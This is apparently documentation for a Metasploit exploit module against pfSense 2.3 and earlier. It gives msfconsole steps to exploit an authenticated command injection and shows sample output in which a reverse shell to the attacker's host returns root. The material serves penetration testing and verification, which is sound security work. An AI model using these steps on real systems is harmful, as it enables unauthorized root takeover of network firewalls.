## Description

  This module exploits a vulnerability in pfSense version 2.3 and before which allows an authenticated user to execute arbitrary operating system commands 
  as root.

  This module has been tested successfully on version 2.3 RELEASE.


## Vulnerable Application

  This module has been tested successfully on version CE 2.3 amd64.

  Installer:

  * [pfSense CE 2.3](https://nyifiles.pfsense.org/mirror/downloads/old/pfSense-CE-2.3-RELEASE-amd64.iso.gz)


## Verification Steps

  1. Start `msfconsole`
  2. Do: `use exploit/unix/http/pfsense_group_member_exec`
  3. Do: `set rhost [IP]`
  4. Do: `set username [username]`
  5. Do: `set password [password]`
  6. Do: `exploit`
  7. You should get a session


## Sample Output

```
[*] Processing pfsense.rc for ERB directives.
resource (pfsense.rc)> use exploit/unix/http/pfsense_group_member_exec
resource (pfsense.rc)> set rhost 192.168.2.15
rhost => 192.168.2.15
resource (pfsense.rc)> set verbose true
verbose => true
resource (pfsense.rc)> check
[*] 192.168.2.15:443 The target service is running, but could not be validated.
resource (pfsense.rc)> exploit
[*] Started reverse TCP handler on 192.168.2.147:4444 
[*] CSRF Token for login: sid:e03842f251d3dacb9df81c00a328431580c8fed5,1510715698;ip:ca2fedb3100f0d4d998c9a6a4bb14a624ff904ec,1510715698
[*] Successful Authentication
[+] Login Successful
[*] CSRF Token for group creation: sid:c8b3595aa9e5479086e5ea24f12f737f84dc39a7,1510715698
[*] Command shell session 1 opened (192.168.2.147:4444 -> 192.168.2.15:65499) at 2017-11-14 22:14:58 -0500

whoami
root
uname -a
FreeBSD . 10.3-RELEASE FreeBSD 10.3-RELEASE #6 05adf0a(RELENG_2_3_0): Mon Apr 11 18:52:07 CDT 2016     root@ce23-amd64-builder:/builder/pfsense-230/tmp/obj/builder/pfsense-230/tmp/FreeBSD-src/sys/pfSense  amd64
```
